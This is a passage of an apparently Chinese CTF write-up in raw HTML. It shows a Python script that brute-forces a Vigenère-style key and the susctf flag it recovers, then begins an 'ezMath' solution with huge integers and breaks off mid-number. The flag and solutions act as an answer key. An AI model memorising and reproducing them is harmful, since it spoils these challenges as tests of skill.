data-num=\"39\"></td><td><pre>        k_i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> msg</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getk</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        k <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                m <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                r <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                k_ <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">26</span><span class=\"token operator\">*</span>n <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token keyword\">if</span> k_<span class=\"token punctuation\">.</span>islower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                    k <span class=\"token operator\">+=</span> k_</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\"># print(encrypt(flag, key))</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_random_string</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    random_string <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_lowercase<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">return</span> random_string</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token string\">'ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;'</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>letters <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz'</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\"># 生成所有可能的 4 个字母组合</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>combinations <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">for</span> letter1 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">for</span> letter2 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">for</span> letter3 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token keyword\">for</span> letter4 <span class=\"token keyword\">in</span> letters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                combination <span class=\"token operator\">=</span> letter1 <span class=\"token operator\">+</span> letter2 <span class=\"token operator\">+</span> letter3 <span class=\"token operator\">+</span> letter4</pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                combinations<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>combination<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">for</span> combo <span class=\"token keyword\">in</span> combinations<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token string\">\"qkxjuk\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>combo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token comment\"># print(key)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">38</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># msg = 'susctf'</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\"># getk(msg, res)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token comment\"># k = \"qkxjuk\"</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;</pre></td></tr><tr><td data-num=\"88\"></td><td><pre>'''</pre></td></tr></table></figure><p>运行后得到如下结果：</p>\n<p><img data-src=\"image-20231016083557773.png\" alt=\"image-20231016083557773\"></p>\n<p>加上前面的 susctf 就可以得到正确的 flag：</p>\n<p><code>susctf&#123;afaab6c3-04ed-41c3-bf78-a040377ff146&#125;</code></p>\n<h3 id=\"ezmath\"><a class=\"markdownIt-Anchor\" href=\"#ezmath\">#</a> ezMath</h3>\n<p>题目如下：求出满足下列式子的最小正整数解 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>，</mtext><mi>b</mi><mtext>，</mtext><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">a，b，c</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">b</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">c</span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mfrac><mi>a</mi><mrow><mi>b</mi><mo>+</mo><mi>c</mi></mrow></mfrac><mo>+</mo><mfrac><mi>b</mi><mrow><mi>a</mi><mo>+</mo><mi>c</mi></mrow></mfrac><mo>+</mo><mfrac><mi>c</mi><mrow><mi>a</mi><mo>+</mo><mi>b</mi></mrow></mfrac><mo>=</mo><mn>10</mn></mrow><annotation encoding=\"application/x-tex\">\\frac{a}{b+c} +\\frac{b}{a+c}+\\frac{c}{a+b} =10\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.8768900000000002em;vertical-align:-0.7693300000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.10756em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">c</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7693300000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.14077em;vertical-align:-0.7693300000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.37144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">c</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7693300000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.8768900000000002em;vertical-align:-0.7693300000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.10756em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">b</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7693300000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span></span></span></span></span></p>\n<p>这一题感觉是纯粹的数学问题，在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYXRoLnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy80MDI1MzcvZmluZC1pbnRlZ2VyLWluLXRoZS1mb3JtLWZyYWNhYmMtZnJhY2JjYS1mcmFjY2Fi\">网上</span>找到了相关解的答案如下所示：</p>\n<p><img data-src=\"image-20231014234349719.png\" alt=\"image-20231014234349719\"></p>\n<p>因而</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo>=</mo><mn>22185598160238070419680451885431654175988385793202828558181254940463484424373750274401154</mn><mspace linebreak=\"newline\"></mspace><mn>9757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</mn></mrow><annotation encoding=\"application/x-tex\">a=22185598160238070419680451885431654175988385793202828558181254940463484424373750274401154\\\\9757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">4</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">7</span></span></span></span></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi><mo>=</mo><mn>269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663</mn><mspace linebreak=\"newline\"></mspace><mn>156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</mn></mrow><annotation encoding=\"application/x-tex\">b=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663\\\\156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">3</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">7</span></span></span></span></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>=</mo><mn>48623787453806426267373181014849776372190573235646589076866533395997144547905591309463209539</mn><mspace linebreak=\"newline\"></mspace><mn>38197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</mn></mrow><annotation encoding=\"application/x-tex\">c=48623787453806426267373181014849776372190573235646589076866533395997144547905591309463209539\\\\38197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">4</span><span 